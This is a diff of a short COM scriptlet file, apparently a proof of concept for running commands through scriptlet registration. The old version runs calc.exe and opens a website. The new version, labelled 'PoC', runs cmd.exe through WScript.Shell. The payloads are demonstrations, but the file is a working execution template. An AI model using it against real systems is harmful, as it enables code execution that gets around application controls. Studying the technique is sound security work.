@@ -1,33 +1,14 @@
 <?XML version="1.0"?>
 <scriptlet>
-
-<registration
-    description="Empire"
-    progid="Empire"
-    version="1.00"
-    classid="{20001111-0000-0000-0000-0000FEEDACDC}"
-    >
-    <script language="JScript">
-        <![CDATA[
-            var r = new ActiveXObject("WScript.Shell").Run("iexplore.exe www.nsideattacklogic.de"); 
-            var s = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
-        ]]>
+<registration 
+    progid="PoC"
+    classid="{F0002222-0000-0000-0000-0000ADECBCDA}" >
+	<script language="JScript">
+		<![CDATA[
+	
+			var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");	
+	
+		]]>
 </script>
 </registration>
-
-<public>
-    <method name="Exec"></method>
-</public>
-<script language="JScript">
-<![CDATA[
-    
-    function Exec()
-    {
-        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
-        var s = new ActiveXObject("WScript.Shell").Run("cmd.exe");
-    }
-    
-]]>
-</script>
-
 </scriptlet>
